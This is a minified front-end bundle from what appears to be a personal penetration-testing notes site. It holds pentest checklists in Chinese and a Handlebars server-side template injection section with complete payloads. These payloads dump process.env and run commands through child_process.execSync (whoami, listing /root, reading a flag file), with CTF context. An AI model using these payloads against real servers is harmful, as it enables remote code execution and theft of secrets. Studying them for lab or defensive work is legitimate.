(self.webpackChunkant_design_pro=self.webpackChunkant_design_pro||[]).push([[9123,3123],{159465:function(M,g,t){"use strict";t.d(g,{Z:function(){return l}});var u=t(28991),e=t(667294),w={icon:{tag:"svg",attrs:{viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M696 480H328c-4.4 0-8 3.6-8 8v48c0 4.4 3.6 8 8 8h368c4.4 0 8-3.6 8-8v-48c0-4.4-3.6-8-8-8z"}},{tag:"path",attrs:{d:"M512 64C264.6 64 64 264.6 64 512s200.6 448 448 448 448-200.6 448-448S759.4 64 512 64zm0 820c-205.4 0-372-166.6-372-372s166.6-372 372-372 372 166.6 372 372-166.6 372-372 372z"}}]},name:"minus-circle",theme:"outlined"},r=w,s=t(127029),c=function(p,o){return e.createElement(s.Z,(0,u.Z)((0,u.Z)({},p),{},{ref:o,icon:r}))};c.displayName="MinusCircleOutlined";var l=e.forwardRef(c)},401977:function(M,g,t){"use strict";t.d(g,{Z:function(){return l}});var u=t(28991),e=t(667294),w={icon:{tag:"svg",attrs:{viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M696 480H544V328c0-4.4-3.6-8-8-8h-48c-4.4 0-8 3.6-8 8v152H328c-4.4 0-8 3.6-8 8v48c0 4.4 3.6 8 8 8h152v152c0 4.4 3.6 8 8 8h48c4.4 0 8-3.6 8-8V544h152c4.4 0 8-3.6 8-8v-48c0-4.4-3.6-8-8-8z"}},{tag:"path",attrs:{d:"M512 64C264.6 64 64 264.6 64 512s200.6 448 448 448 448-200.6 448-448S759.4 64 512 64zm0 820c-205.4 0-372-166.6-372-372s166.6-372 372-372 372 166.6 372 372-166.6 372-372 372z"}}]},name:"plus-circle",theme:"outlined"},r=w,s=t(127029),c=function(p,o){return e.createElement(s.Z,(0,u.Z)((0,u.Z)({},p),{},{ref:o,icon:r}))};c.displayName="PlusCircleOutlined";var l=e.forwardRef(c)},630461:function(M){M.exports={pyramidWra:"pyramidWra___27LyC",isOverFlow:"isOverFlow___2Gm9M",pyramidItem:"pyramidItem___33y6q",pyramidItem_levelTag:"pyramidItem_levelTag___3a_4s",pyramidItem_SubItem_Title:"pyramidItem_SubItem_Title___1kxQ_",pyramidLv:"pyramidLv___ReHfA",pyramid_lv_1_item:"pyramid_lv_1_item___2M4nG",pyramid_lv_2_item:"pyramid_lv_2_item___2qhNd",pyramid_lv_3_item:"pyramid_lv_3_item___3gwuq",pyramid_lv_4_item:"pyramid_lv_4_item___2vZY_"}},130695:function(M,g,t){"use strict";t.d(g,{E:function(){return a}});var u=t(311849),e=t(667294),w=t(630461),r=t.n(w),s=t(735510),c=t.n(s),l=t(481984),F=t(846190),p=t(194657),o=t(159465),v=t(401977),L=t(632445),b=t(615985),_=t(329192),d=t(228990);function y(n){var i=_.Table_Helper.check_isString(n)||d.M4.isElement(n);return i}function A(n){var i=arguments.length>1&&arguments[1]!==void 0?arguments[1]:20,h=y(n);return(0,u.Z)({},h?{minWidth:"".concat(i,"em")}:{})}var P=n=>{var i=n.item,h=n.size,E=n.dispatch,C=n.my_custom_store.is_\u91D1\u5B57\u5854_tooltip_Inited,f=(0,e.useState)(!1),O=(0,p.Z)(f,2),T=O[0],U=O[1];function I(){U(!T)}function x(){return T?"unset":"0"}return e.createElement(e.Fragment,null,e.createElement("h1",{className:c()(r().pyramidItem_SubItem_Title),style:(0,u.Z)({cursor:"pointer"},h==="medium"?A("\u5047\u8BBE\u662F\u4E00\u4E2A\u5185\u5BB9",15):{}),onClick:()=>{I()}},i.name,e.createElement("span",{style:{}},e.createElement(F.Z,{placement:"right",title:"\u53EA\u6709\u81EA\u8EAB\u65E0child\u7684\u8282\u70B9\uFF0C\u624D\u4F1A\u6709\u6700\u5C0F\u5BBD\u5EA6",trigger:C?"contextMenu":"click",onVisibleChange:R=>{R===!0&&E({type:"my_custom_store/sync_set_is_\u91D1\u5B57\u5854_tooltip_Inited",payload:!0})}},T?e.createElement(o.Z,null):e.createElement(v.Z,null)))),T&&e.createElement("div",{style:{}},e.createElement(a,{cfg:i.sub,isChildPyramid:!0})))},S=L.PG.getInstance(P,b.Z);function m(n,i){var h=y(n)?n.length>0?e.createElement("h1",null,n):void 0:e.createElement(S,{item:n,size:i});return h}var a=n=>{var i,h,E,C,f=n.cfg,O=n.style,T=n.isChildPyramid,U=T===void 0?!1:T,I=n.isOverFlow,x=I===void 0?!1:I,R=n.size,B=R===void 0?"medium":R;function Z(D){var W={1:"\u2460",2:"\u2461",3:"\u2462",4:"\u2463"}[D];return e.createElement("h3",{className:r().pyramidItem_levelTag},W)}return e.createElement(e.Fragment,null,e.createElement("div",{className:c()(r().pyramidWra,{[r().isChildPyramid]:U,[r().isOverFlow]:x}),style:O},e.createElement("div",{className:c()(r().pyramidLv,r().pyramid_lv_1)},(i=f.lv1)===null||i===void 0?void 0:i.map(D=>e.createElement("div",{className:c()(r().pyramidItem,r().pyramid_lv_1_item),style:(0,u.Z)((0,u.Z)({},A(D)),{},{position:"relative"})},m(D,B),Z(1)))),e.createElement("div",{className:c()(r().pyramidLv,r().pyramid_lv_2)},(h=f.lv2)===null||h===void 0?void 0:h.map(D=>e.createElement("div",{className:c()(r().pyramidItem,r().pyramid_lv_2_item),style:(0,u.Z)((0,u.Z)({},A(D)),{},{position:"relative"})},m(D,B),Z(2)))),e.createElement("div",{className:c()(r().pyramidLv,r().pyramid_lv_3)},(E=f.lv3)===null||E===void 0?void 0:E.map(D=>e.createElement("div",{className:c()(r().pyramidItem,r().pyramid_lv_3_item),style:(0,u.Z)((0,u.Z)({},A(D)),{},{position:"relative"})},m(D,B),Z(3)))),e.createElement("div",{className:c()(r().pyramidLv,r().pyramid_lv_4)},(C=f.lv4)===null||C===void 0?void 0:C.map(D=>e.createElement("div",{className:c()(r().pyramidItem,r().pyramid_lv_4_item),style:(0,u.Z)((0,u.Z)({},A(D)),{},{position:"relative"})},m(D,B),Z(4))))))}},947323:function(M,g,t){"use strict";t.d(g,{EN:function(){return v},sw:function(){return _},sy:function(){return d},cU:function(){return A},BJ:function(){return P},RY:function(){return S}});var u=t(705795),e=t(667294),w=t(130695),r=t(329192),s=t(888767),c=t(635801),l=[0,0+1,0+1+3,0+1+3+9,0+1+3+9+27];function F(m,a){var n=a-1,i=a+1-1;return m.slice(l[n],l[i])}function p(m){return m.map(a=>{if(r.Table_Helper.check_isString(a))return a;var n=a,i=o(n);return i})}function o(m){var a=m,n=a[0]||"--",i=a.slice(1),h=F(i,1),E=F(i,2),C=F(i,3),f=F(i,4);return{name:n,sub:{lv1:p(h),lv2:p(E),lv3:p(C),lv4:p(f)}}}var v=m=>{var a=m.strings,n=m.size,i=n===void 0?"medium":n,h=m.isMobile,E=h===void 0?!1:h,C=["--",...a],f=o(C).sub,O=f.lv1,T=f.lv2,U=f.lv3,I=f.lv4;if(E){let R=function(B){if(r.Table_Helper.check_isString(B)){var Z=B;return e.createElement(e.Fragment,null,e.createElement("li",null,Z))}else{var D=B,W=(0,u.Z)(D),z=W[0],K=W.slice(1);return e.createElement(e.Fragment,null,e.createElement("li",null,z),e.createElement("ol",null,K.map(k=>e.createElement(e.Fragment,null,e.createElement("li",null,R(k))))))}};var x="ol";switch(x){case"ol":return e.createElement("ol",null,a.map(B=>R(B)));case"\u666E\u901A\u6587\u672C":return e.createElement("ol",null,a.flat(21).map(B=>e.createElement("li",null,B)))}}else return e.createElement(e.Fragment,null,e.createElement(w.E,{cfg:{lv1:O,lv2:T,lv3:U,lv4:I!=null?I:[]},size:i}))},L=null,b=["\u67E5\u627E\u4E2D\u95F4\u4EF6","\u67E5\u627E\u4E2D\u95F4\u4EF6\u7248\u672C\u3001\u67E5\u627ECVE","\u4E2D\u95F4\u4EF6\uFF0C\u5982\u679C\u6709\u767B\u5F55\u53E3\uFF0C\u53EF\u4EE5\u67E5\u627E\u9ED8\u8BA4\u5BC6\u7801","\u8FDB\u884C\u76EE\u5F55\u679A\u4E3E","\u6574\u7406\u9690\u79C1\u6587\u4EF6","\u6CE8\u610F\u4E00\u4E9B\u3010\u91CD\u8981\u4E8C\u8FDB\u5236\u6587\u4EF6\u3011",["\u5F31\u53E3\u4EE4\uFF0C\u4ECE\u6CA1\u6709\u4E00\u4E2A\u65F6\u4EE3\uFF0C\u50CF\u73B0\u5728","1"],["\u4EE5\u3010\u53EF\u53E0\u52A0\u3011\u65B9\u5F0F\u6536\u96C6\u6700\u65B0\u7684\u6F0F\u6D1E\u4FE1\u606F","HackerOne",c.Wx._1_links__\u5916\u90E8\u7F51\u9875._\u5B89\u5168\u8D44\u8BAF._Hacking8]],_=e.createElement(e.Fragment,null,e.createElement("h1",null,"\u901A\u7528\u8868\u2014\u2014\u770B\u4E0D\u5230\u4FE1\u606F\u2014\u2014\u9700\u8981\u76F2\u8BD5"),e.createElement("h2",null,"\uFF08\u91CD\u8981\u6027\u6392\u5E8F\uFF09"),e.createElement(v,{strings:b,size:"mini"})),d=e.createElement(e.Fragment,null,e.createElement("h1",null,"\u9776\u673A\u600E\u4E48\u6253"),e.createElement("h2",null,"\u987A\u5E8F\u6392\u5E8F"),e.createElement(v,{strings:["\u5916\u90E8\u4FE1\u606F\u6536\u96C6\uFF08\u975E\u5FC5\u8981\uFF09",["Enumeration/\u679A\u4E3E","\u8D44\u4EA7\u626B\u63CF"],"Identification / \uFF1F\uFF1F\uFF1F","Exploit / Exp\u5229\u7528","Foothold/\u5229\u7528\u70B9\u67E5\u627E","Post-Exploitation / \u540E\u6E17\u900F","Lateral Movement / \u6A2A\u5411\u6E17\u900F","Privilege Escalation / \u63D0\u6743"],size:"mini"}));function y(m){var a=m.routes,n=m.name,i=n===void 0?"--":n;return a?[i,...a.map(h=>y(h))]:i}var A=e.createElement(e.Fragment,null,e.createElement("h1",null,"\u6B63\u5E38\u5168\u6D41\u7A0B-\u6E17\u900F\u6D4B\u8BD5\u6D41\u7A0B"),e.createElement("h2",null,"\u987A\u5E8F\u6392\u5E8F"),(()=>{var m=[...s.LI.get_\u6E17\u900F\u6D41\u7A0B_routes().map(a=>y(a))];return e.createElement(v,{strings:m,size:"mini"})})()),P=e.createElement(e.Fragment,null,e.createElement("h1",null,"\u56FD\u8D44\u4E91\u6388\u6743\u6D4B\u8BD5"),e.createElement("h2",null,"\u987A\u5E8F\u6392\u5E8F"),e.createElement(v,{strings:[["\u5916\u7F51\u6D4B\u8BD5","\u4FE1\u606F\u6536\u96C6\uFF08\u7565\uFF09",["\u8D44\u4EA7\u626B\u63CF","Goby","nmap"],["\u6F0F\u6D1E\u624B\u6D4B",["\u8D26\u53F7\u76F8\u5173","\u5F31\u53E3\u4EE4"],"SQL\u6CE8\u5165"]],["\u5185\u7F51\u6D4B\u8BD5",["\u8D44\u4EA7\u626B\u63CF","FScan\uFF08\u6548\u679C\u5947\u597D\uFF01\u64CD\u4F5C\u50BB\u74DC\uFF09","\u548C\u5916\u7F51\u76F8\u540C\uFF1AGoby\u3001nmap"]]],size:"mini"})),S=e.createElement(e.Fragment,null,e.createElement("h1",null,"\u62A4\u7F51\u7EA2\u961F"),e.createElement("h2",null,"\u987A\u5E8F\u6392\u5E8F"),e.createElement(v,{strings:[["\u57FA\u672C\u6D41\u7A0B","\u5165\u53E3\u6743\u9650\uFF08\u79F0\u4E3A\u6253\u70B9\uFF09","\u5185\u7F51\u641C\u96C6/\u63A2\u6D4B","\u514D\u6740\u63D0\u6743","\u6293\u53D6\u767B\u5F55\u51ED\u8BC1","\u8DE8\u5E73\u53F0\u7684\u6A2A\u5411\u653B\u51FB","\u5165\u53E3\u6743\u9650\u7EF4\u6301","\u96A7\u9053\u6570\u636E\u56DE\u4F20","\u5B9A\u671F\u6743\u9650\u7EF4\u6301"],"\u4FE1\u606F\u6CC4\u9732\u6536\u96C6","\u8D44\u4EA7\u6536\u96C6"],size:"mini"}))},242776:function(M,g,t){"use strict";t.d(g,{cK:function(){return L},du:function(){return b}});var u=t(868137),e=t(450532),w=t(311849),r=t(194657),s=t(667294),c=t(406066),l=t(329192),F={};function p(_){return F[_]||(F[_]=new c.f("Hack_Cp____"+_)),F[_]}function o(_,d){var y=encodeURIComponent(_);return d?(0,l.get_copyable_preLabel_\u53EF\u590D\u5236\u7684\u591A\u884CPre)(d,y):s.createElement("pre",null,y)}function v(_,d){var y=encodeURI(_);return d?get_copyable_preLabel_\u53EF\u590D\u5236\u7684\u591A\u884CPre(d,y):React.createElement("pre",null,y)}var L=_=>{var d=_.special_name,y=_.var_names_arr,A=_.code_template_arr,P=_.gen_str_transfer_fn,S=p(d),m=(0,s.useState)(S.loadData____\u5141\u8BB8\u90E8\u5206\u6570\u636E\u6B8B\u7F3A()),a=(0,r.Z)(m,2),n=a[0],i=a[1],h=(()=>A.map(E=>{var C=E;return y.forEach(f=>{var O;C=C.replaceAll("###<".concat(f,">###"),((O=n[f])===null||O===void 0?void 0:O.trim())||"\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014")}),C}))();return s.createElement("div",{style:(0,w.Z)({},l.\u5E38\u89C1_border\u8FB9\u6846)},y.map(E=>s.createElement("div",null,"\u3010",E,"\u3011\uFF1A",s.createElement(e.Z,{value:n[E],onChange:C=>{S.simple_set_and_save(E,C,n,i)}}))),h.map(E=>s.createElement(s.Fragment,null,(0,l.get_copyable_preLabel_\u53EF\u590D\u5236\u7684\u591A\u884CPre)("\u6A21\u677F\u751F\u6210\u3010".concat(d,"\u3011"),E),P==null?void 0:P(E,d))))};class b{}b.SSTI={HandleBars:{\u4ECB\u7ECD:"Server-Side Template Injection",\u76F8\u5173\u6280\u5DE7:s.createElement(s.Fragment,null,s.createElement(L,{special_name:"HandleBars",var_names_arr:["code"],code_template_arr:[`
                {{#with "s" as |string|}}
                   {{#with "e"}}
                       {{#with split as |conslist|}}
                           {{this.pop}}
                           {{this.push (lookup string.sub "constructor")}}
                           {{this.pop}}
                           {{#with string.split as |codelist|}}
                               {{this.pop}}
                               {{this.push "return  ###<code>###  ;"}}
                               {{this.pop}}
                               {{#each conslist}}
                                   {{#with (string.sub.apply 0 codelist)}}
                                       {{this}}
                                   {{/with}}
                               {{/each}}
                           {{/with}}
                       {{/with}}
                   {{/with}}
                {{/with}}
        `],gen_str_transfer_fn:_=>o(_,"URL\u7F16\u7801")}),`

    \u76F8\u5173\u6280\u5DE7\u8BF4\u660E\uFF1A
        https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#handlebars-nodejs
        \u539F\u59CB\u6750\u6599\u6765\u6E90\uFF1Ahttps://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/#RCE-%F0%9F%92%A3

    \u8FDB\u4E00\u6B65\uFF1A
        \u6709\u65F6\u5019\uFF0C\u4F1A\u9047\u5230\u3010require\u3011\u65E0\u6CD5\u8BBF\u95EE\u7684\u95EE\u9898\u3002\u6B64\u65F6\uFF0C\u53EF\u80FD\u662F\u9047\u5230\u4E86\u3010\u6C99\u76D2\u6A21\u5F0F\u3011

        \u7136\u540E\uFF0C\u3010require("process").exec\u3011\u6709\u65F6\u5019\uFF0C\u65E0\u6CD5\u7ACB\u5373\u5F97\u5230\u7ED3\u679C\uFF1A
            1. exec\uFF0C      \u662F\u3010\u5F02\u6B65\u65B9\u6CD5\u3011
            2. execSync\uFF0C  \u662F\u3010\u540C\u6B65\u65B9\u6CD5\u3011

    Exp
        \uFF08\u9776\u573A\uFF0C\u5F53\u65F6\u662F\u53EF\u4EE5\u76F4\u63A5\u6267\u884C\u7684\uFF0C\u5148\u7528UrlEncode\u4E00\u4E0B\u3002\uFF09


        \u4E00\u4E9B\u3010CTF\u60AC\u8D4F\u3011\u7684\u7B54\u6848\uFF1A

                <!-- (by [@avlidienbrunn](https://twitter.com/avlidienbrunn)) -->

                {{#with "s" as |string|}}
                  {{#with "e"}}
                    {{#with split as |conslist|}}
                      {{this.pop}}
                      {{this.push (lookup string.sub "constructor")}}
                      {{this.pop}}
                      {{#with string.split as |codelist|}}
                        {{this.pop}}
                        {{this.push "return JSON.stringify(process.env);"}}
                        {{this.pop}}
                        {{#each conslist}}
                          {{#with (string.sub.apply 0 codelist)}}
                            {{this}}
                          {{/with}}
                        {{/each}}
                      {{/with}}
                    {{/with}}
                  {{/with}}
                {{/with}}

        \u4E00\u4E9B\u63A2\u6D4B\uFF0C\u63A2\u6D4B\u3010process\u3011\u662F\u5426\u6709\u6548\uFF1A
                {{#with "s" as |string|}}
                   {{#with "e"}}
                     {{#with split as |conslist|}}
                         {{this.pop}}
                         {{this.push (lookup string.sub "constructor")}}
                         {{this.pop}}
                         {{#with string.split as |codelist|}}
                         {{this.pop}}
                         {{this.push "return process;"}}
                         {{this.pop}}
                         {{#each conslist}}
                           {{#with (string.sub.apply 0 codelist)}}
                             {{this}}
                           {{/with}}
                         {{/each}}
                       {{/with}}
                     {{/with}}
                   {{/with}}
                {{/with}}

        \u4E00\u4E9B\u63A2\u6D4B\uFF0C\u63A2\u6D4B\u3010process.mainModule\u3011\u662F\u5426\u6709\u6548\uFF1A
                {{#with "s" as |string|}}
                   {{#with "e"}}
                       {{#with split as |conslist|}}
                           {{this.pop}}
                           {{this.push (lookup string.sub "constructor")}}
                           {{this.pop}}
                           {{#with string.split as |codelist|}}
                               {{this.pop}}
                               {{this.push "return process.mainModule;"}}
                               {{this.pop}}
                               {{#each conslist}}
                                   {{#with (string.sub.apply 0 codelist)}}
                                      {{this}}
                                   {{/with}}
                               {{/each}}
                           {{/with}}
                       {{/with}}
                   {{/with}}
                {{/with}}

        \u4E00\u4E9B\u63A2\u6D4B\uFF0C\u63A2\u6D4B\u3010process.mainModule.require('child_process')\u3011\u662F\u5426\u6709\u6548\uFF1A
                {{#with "s" as |string|}}
                   {{#with "e"}}
                       {{#with split as |conslist|}}
                           {{this.pop}}
                           {{this.push (lookup string.sub "constructor")}}
                           {{this.pop}}
                           {{#with string.split as |codelist|}}
                               {{this.pop}}
                               {{this.push "return process.mainModule.require('child_process');"}}
                               {{this.pop}}
                               {{#each conslist}}
                                   {{#with (string.sub.apply 0 codelist)}}
                                      After URL encoding and sending the payload, we get the following response from the server:
                                      The require object has been called successfully and the child_process module loaded. Let's now
                                      attempt to run system commands.
                                      We will need to URL encode the above payload once again.
                                       {{this}}
                                   {{/with}}
                               {{/each}}
                           {{/with}}
                       {{/with}}
                   {{/with}}
                {{/with}}

        \u4E00\u4E9B\u63A2\u6D4B\uFF0C\u63A2\u6D4B\u3010process.mainModule.require('child_process').execSync('whoami')\u3011\u662F\u5426\u6709\u6548\uFF1A
                \uFF08\u5DF2\u7ECF\uFF0C\u83B7\u5F97\u4E86\u3010whoami\u3011  \u6267\u884C\u7684\u7ED3\u679C\uFF01\uFF01\uFF09

                {{#with "s" as |string|}}
                   {{#with "e"}}
                       {{#with split as |conslist|}}
                           {{this.pop}}
                           {{this.push (lookup string.sub "constructor")}}
                           {{this.pop}}
                           {{#with string.split as |codelist|}}
                               {{this.pop}}
                               {{this.push "return    process.mainModule.require('child_process').execSync('whoami');"}}
                               {{this.pop}}
                               {{#each conslist}}
                                   {{#with (string.sub.apply 0 codelist)}}
                                       {{this}}
                                   {{/with}}
                               {{/each}}
                           {{/with}}
                       {{/with}}
                   {{/with}}
                {{/with}}


                \u5728\u3010\u8FD9\u4E2APoC\u3011\u6D4B\u8BD5\u6210\u529F\u540E\uFF0C\u540E\u9762\u7684\u6D4B\u8BD5\uFF0C\u5C31\u90FD\u662F\u3010\u9010\u6B65\u8FD0\u884C\u547D\u4EE4\u3011\u4E86\uFF01\uFF01
                    \u3010 process.mainModule.require('child_process').execSync('ls /root');  \u3011
                    \u3010 process.mainModule.require('child_process').execSync('cat /root/flag.txt');  \u3011

                \u5982\u6B64\u9012\u5F52\uFF0C\u5F88\u5FEB\u5C31\u53EF\u4EE5\u62FF\u5230\u3010Flag.txt\u3011\u3002


    `)}},b.Jenkins=s.createElement(s.Fragment,null,`
              \u8A79\u91D1\u65AF-HackTricks
                  https://book.hacktricks.xyz/pentesting/pentesting-web/jenkins
  `),b.mssql_sqlserver=s.createElement(s.Fragment,null,`
      MSSQL - Microsoft SQL Server
          https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server
  `),b.CodeReview_\u4EE3\u7801\u5BA1\u8BA1={\u8BB0\u5F55\u7684_\u5BA1\u8BA1\u5DE5\u5177:s.createElement(s.Fragment,null,`
      \u5BA1\u8BA1\u5DE5\u5177\uFF1A

          https://book.hacktricks.xyz/pentesting/pentesting-web/code-review-tools
    `),\u5728\u7F51\u9875\u5BA1\u8BA1\u4E2D_\u4ECB\u4E8E\u767D\u76D2\u548C\u9ED1\u76D2\u4E4B\u95F4:s.createElement(s.Fragment,null,`
      \u5728\u7F51\u9875\u5BA1\u8BA1\u4E2D\uFF0C\u4ECB\u4E8E\u767D\u76D2\u548C\u9ED1\u76D2\u4E4B\u95F4\uFF1A

          https://book.hacktricks.xyz/pentesting/pentesting-web#source-code-review
    `),\u4E91\u5B89\u5168_CloudSecurity:s.createElement(s.Fragment,null,`
      \u3010\u4E91\u5B89\u5168\u3011\u4EE3\u7801\u5BA1\u8BA1\uFF1A

          https://book.hacktricks.xyz/cloud-security/cloud-security-review
    `)}},179445:function(M,g,t){"use strict";t.r(g);var u=t(667294),e=t(240675),w=t(654433);g.default=()=>u.createElement(u.Fragment,null,u.createElement(w.Tg,{h_em:21.5}),u.createElement("div",{style:{marginTop:"1em"}},u.createElement(e.ZP,{flag_personalText:!1})))},621105:function(M,g,t){"use strict";var u=t(722122),e=t(667294),w=t(290826),r=function(l,F){var p={};for(var o in l)Object.prototype.hasOwnProperty.call(l,o)&&F.indexOf(o)<0&&(p[o]=l[o]);if(l!=null&&typeof Object.getOwnPropertySymbols=="function")for(var v=0,o=Object.getOwnPropertySymbols(l);v<o.length;v++)F.indexOf(o[v])<0&&Object.prototype.propertyIsEnumerable.call(l,o[v])&&(p[o[v]]=l[o[v]]);return p},s={border:0,background:"transparent",padding:0,lineHeight:"inherit",display:"inline-block"},c=e.forwardRef(function(l,F){var p=function(A){var P=A.keyCode;P===w.Z.ENTER&&A.preventDefault()},o=function(A){var P=A.keyCode,S=l.onClick;P===w.Z.ENTER&&S&&S()},v=l.style,L=l.noStyle,b=l.disabled,_=r(l,["style","noStyle","disabled"]),d={};return L||(d=(0,u.Z)({},s)),b&&(d.pointerEvents="none"),d=(0,u.Z)((0,u.Z)({},d),v),e.createElement("div",(0,u.Z)({role:"button",tabIndex:0,ref:F},_,{onKeyDown:p,onKeyUp:o,style:d}))});g.Z=c},104517:function(M,g,t){"use strict";t.d(g,{d:function(){return u}});function u(){return function(e){}}}}]);
